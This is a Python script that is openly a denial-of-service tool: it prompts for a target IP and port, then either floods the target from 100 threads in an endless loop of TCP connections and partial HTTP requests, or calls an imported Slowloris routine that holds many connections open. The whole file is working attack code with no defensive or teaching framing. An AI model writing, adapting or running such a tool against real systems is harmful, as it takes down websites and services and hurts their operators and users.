import socket
import threading
from slowloris import slowloris_attack

def perform_ddos_attack(target_ip, target_port, num_threads=10):
    def attack():
        while True:
            try:
                # Create a socket object
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Connect to the target
                sock.connect((target_ip, target_port))

                # Send a dummy request
                sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))

                # Close the socket
                sock.close()
            except Exception as e:
                print(f"Error during DDoS attack: {str(e)}")

    # Create and start multiple threads to simulate concurrent requests
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("\nDDoS attack complete.")

def slowloris_ddos(host, port, num_connections=100, https=False, proxy=False, sleep_time=5):
    if 0.1 <= sleep_time <= 10:
        slowloris_attack(host, port, num_connections, True, https, proxy, None, None, False, sleep_time)
    else:
        print("Invalid sleep time. Please enter a value between 0.1 and 10 seconds.")

def ddos(host, port, ssl=False, method=None):
    if method == 1:
        sleep_time = float(input("Enter Slowloris sleep time duration (in seconds): "))
        slowloris_ddos(host, port, 100, ssl, True, sleep_time)
    
    if method == 2:
        perform_ddos_attack(host, port, 100)

def perform_ddos_attack_wrapper():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))

    print("Choose DDoS method:")
    print("[1] Slowloris")
    print("[2] Normal DDoS")
    method = int(input("Enter method number: "))

    ssl = input("Use SSL? (yes/no): ").lower() == "yes"

    if method == 1:
        sleep_time = float(input("Enter Slowloris sleep time duration (in seconds): "))
        slowloris_ddos(target_ip, target_port, 100, ssl, True, sleep_time)
    elif method == 2:
        perform_ddos_attack(target_ip, target_port, 100)

# Example Usage:
# perform_ddos_attack_wrapper()
